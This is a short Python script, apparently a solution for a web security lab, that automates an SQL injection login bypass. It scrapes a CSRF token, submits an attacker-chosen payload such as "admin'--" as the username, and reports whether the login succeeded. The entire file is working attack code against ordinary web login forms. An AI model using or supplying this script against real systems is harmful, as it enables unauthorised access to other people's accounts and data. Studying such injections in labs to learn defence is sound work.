#!/usr/bin/env python3
import requests
import sys
from bs4 import BeautifulSoup

def get_csrf_token(s, url):
    r = s.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {'csrf':csrf, 'username':payload, 'password':'ok'}
    r = s.post(url, data=data)
    if "Log out" in r.text:
        return True
    else:
        return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print("[*] Usage: {} <url> <sql.payload>".format(sys.argv[0]))
        print('[*] Example: {} http://example.com "admin\'--"'.format(sys.argv[0]))
        sys.exit(1)

    s = requests.Session()

    if exploit_sqli(s, url, sqli_payload):
        print("[*] SQL injection successful login.")
    else:
        print("[*] SQL injection not successful login.")
